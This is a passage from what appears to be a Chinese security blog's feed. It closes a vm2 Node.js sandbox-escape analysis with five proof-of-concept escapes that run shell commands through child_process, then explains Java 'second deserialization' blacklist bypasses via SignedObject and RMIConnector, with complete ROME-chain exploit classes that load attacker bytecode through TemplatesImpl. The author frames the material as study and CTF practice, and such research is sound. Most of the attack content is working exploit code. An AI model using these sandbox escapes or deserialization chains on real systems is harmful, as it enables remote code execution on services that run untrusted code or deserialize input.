alt="image.png"></p><p>至此沙盒的第二行代码分析完成，我们发现a.i.constructor&#x3D;&#x3D;&#x3D;host.Function，似乎可以逃逸出去？<br>最后是沙盒的第三行代码，通过打印输出a.i，观察是否可以获取到能逃逸的代理对象a.i。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">value</span>(), contextify.<span class="property">js</span>:<span class="number">417</span></span><br><span class="line"><span class="title function_">get</span>(), contextify.<span class="property">js</span>:<span class="number">271</span></span><br><span class="line"><span class="title function_">anonymous</span>(), sandbox.<span class="property">js</span>:<span class="number">3</span></span><br><span class="line"><span class="title function_">runInContext</span>(), <span class="attr">vm</span>:<span class="number">133</span></span><br><span class="line"><span class="title function_">run</span>(), main.<span class="property">js</span>:<span class="number">204</span></span><br><span class="line"><span class="title function_">anonymous</span>(), <span class="built_in">escape</span>.<span class="property">js</span>:<span class="number">5</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="title function_">_compile</span>(), <span class="attr">loader</span>:<span class="number">1376</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property">_extensions</span>..<span class="title function_">js</span>(), <span class="attr">loader</span>:<span class="number">1435</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="title function_">load</span>(), <span class="attr">loader</span>:<span class="number">1207</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="title function_">_load</span>(), <span class="attr">loader</span>:<span class="number">1023</span></span><br><span class="line"><span class="title function_">executeUserEntryPoint</span>(), <span class="attr">run_main</span>:<span class="number">135</span></span><br><span class="line"><span class="title function_">anonymous</span>(), <span class="attr">run_main_module</span>:<span class="number">28</span></span><br></pre></td></tr></table></figure><p>这里最先触发的是Contextify#instance#get，显然是我们获取代理对象a的i属性时触发了getter。<br>很遗憾，在这个getter返回时，会先把a.i进行封装，然后再返回，我们无法获取到解封时那个a.i，也就无法逃逸：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705245212290-b9f4bf2a-3d96-4a3b-a944-d4f57f45c824.png" alt="image.png"></p><p>由于value（a.i）在第二行代码运行时保留了缓存，所以直接查询缓存返回：</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1705245774335-d4778680-a085-440c-8488-c9ffc4094afe.png" alt="image.png"></p><p>至此本示例分析完毕。<br>小结：可以发现，Contextify和Decontextify并不是简单的互补关系，而更像一种覆盖关系，代理对象能否访问外部变量取决于最外层的代理是谁封装的。Contextify使对象无法访问到外部变量，Decontextify使对象可以访问到外部变量。一个对象可以不封装而直接解封，这样它就能直接访问外部变量。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>, <span class="title class_">VMScript</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> file = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/sandbox.js`</span>;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> <span class="title class_">VMScript</span>(fs.<span class="title function_">readFileSync</span>(file), file);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(script));</span><br><span class="line">&#125;<span class="keyword">catch</span> (x)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc1</span></span><br><span class="line"><span class="keyword">var</span> process;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">has</span>=<span class="function">(<span class="params">t,k</span>)=&gt;</span>&#123;</span><br><span class="line">    process = t.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot;&quot;</span> <span class="keyword">in</span> <span class="title class_">Buffer</span>.<span class="property">from</span>;</span><br><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc2</span></span><br><span class="line"><span class="keyword">var</span> process;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&quot;&quot;</span>), <span class="string">&quot;&quot;</span>, &#123;<span class="keyword">get</span> <span class="title function_">set</span>()&#123;</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>,<span class="string">&quot;get&quot;</span>,&#123;<span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">                &#125;&#125;);</span><br><span class="line">            <span class="keyword">return</span> <span class="function">()=&gt;</span>&#123;&#125;;</span><br><span class="line">        &#125;&#125;);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    process = <span class="title function_">e</span>(<span class="function">()=&gt;</span>&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc3</span></span><br><span class="line"><span class="keyword">const</span> f = <span class="title class_">Buffer</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">write</span>;</span><br><span class="line"><span class="keyword">const</span> ft = &#123;</span><br><span class="line">    <span class="attr">length</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="title function_">utf8Write</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">r</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        x = <span class="title function_">r</span>(i);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">typeof</span>(x)!==<span class="string">&#x27;number&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">if</span>(x!==i)</span><br><span class="line">        <span class="keyword">return</span> x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        f.<span class="title function_">call</span>(ft);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        i=<span class="title function_">r</span>(i).<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">i.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc4</span></span><br><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">&#x27;./foo.js&#x27;</span>)</span><br><span class="line">res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return this&quot;</span></span>)(<span class="params"></span>).<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc5 测试未通过，和版本有关。</span></span><br><span class="line"><span class="title class_">Symbol</span> = &#123;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">toStringTag</span>()&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Map</span>());</span><br><span class="line">&#125;<span class="keyword">catch</span>(f)&#123;</span><br><span class="line">    <span class="title class_">Symbol</span> = &#123;&#125;;</span><br><span class="line">    <span class="title function_">f</span>(<span class="function">()=&gt;</span>&#123;&#125;).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/207283">https://www.anquanke.com/post/id/207283</a><br><a href="https://www.anquanke.com/post/id/207291">https://www.anquanke.com/post/id/207291</a><br><a href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a><br><a href="https://www.cnblogs.com/zpchcbd/p/16899212.html">https://www.cnblogs.com/zpchcbd/p/16899212.html</a><br>p牛知识星球</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;vm2在2023年7月已经停止维护了，本文仅用作nodejs沙盒逃逸思路的学习。&lt;/p&gt;
&lt;h1 id=&quot;vm&quot;&gt;&lt;a href=&quot;#vm&quot;</summary>
      
    
    
    
    
    <category term="Nodejs" scheme="https://jaspersec.top/tags/Nodejs/"/>
    
    <category term="vm2" scheme="https://jaspersec.top/tags/vm2/"/>
    
  </entry>
  
  <entry>
    <title>Java二次反序列化浅析</title>
    <link href="https://jaspersec.top/posts/1316980488.html"/>
    <id>https://jaspersec.top/posts/1316980488.html</id>
    <published>2023-12-24T06:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目hook resolveClass存在入口类黑名单，就可以用二次反序列化绕过，例如巅峰极客的babyurl。<br>本质是，A类的a方法，内部可以实现反序列化，并且要反序列化的对象我们可控；在B入口类被禁用的情况下，<br>通过把要反序列化的恶意对象b放入A类，用没被禁用的入口类C的readObject，去调用A类的a方法，进而调到B类的readObject，实现绕过黑名单。</p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>SignedObject#getObject会把this.content里的内容反序列化。</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700457171324-9456aed4-056b-4fea-bbc6-9275a0652321.png" alt="image.png"></p><p>而this.content在构造函数里可以控制，传入对象会自动序列化，然后写入this.content</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700457270551-9446c76a-8ad9-4a93-b181-6a2822fb1699.png" alt="image.png"></p><p>把待反序列化对象传入构造函数，将问题转换成反序列化链调用SignedObject#getObjetct。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">kpg.initialize(<span class="number">1024</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(待反序列化对象, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br></pre></td></tr></table></figure><h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><p>RMIConnector#findRMIServerJRMP会把传入的base64参数反序列化<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700463843592-444eea2a-e4d9-46ac-a0cc-93cf2c24ee08.png" alt="image.png"><br>RMIConnector#findRMIServer，如果path以”&#x2F;stub&#x2F;“开头，就会调用findRMIServerJRMP<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700464302536-37dc76bf-eea4-4b5f-8bfc-1843e42cd6c3.png" alt="image.png"><br>RMIConnector#connect，会调用findRMIServer，注意rmiServer要为null<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700464573798-ac8302b4-e693-4781-a78c-69cfb68b8d4c.png" alt="image.png"><br>把待反序列化对象Base64编码拼接到URL后面，将问题转换成调RMIConnector#connect。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);  <span class="comment">// 固定写法，不然创建不了</span></span><br><span class="line">setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/待反序列化对象&quot;</span>);</span><br><span class="line"><span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><h2 id="触发SignedObject-getObject"><a href="#触发SignedObject-getObject" class="headerlink" title="触发SignedObject#getObject"></a>触发SignedObject#getObject</h2><ul><li>ROME链<ul><li>HashMap入口类</li><li>HashTable入口类</li><li>badAttributeValueExpException入口类</li><li>HashMap+HotSwappableTargetSource类</li></ul></li><li>CB1链<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SignedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> Utils.SerialUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="comment">//        SerialUtils.serialize(hashMap);</span></span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SignedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> Utils.SerialUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHashTable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean,<span class="string">&quot;456&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(hashtable);</span><br><span class="line"><span class="comment">//        SerialUtils.unserialize();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 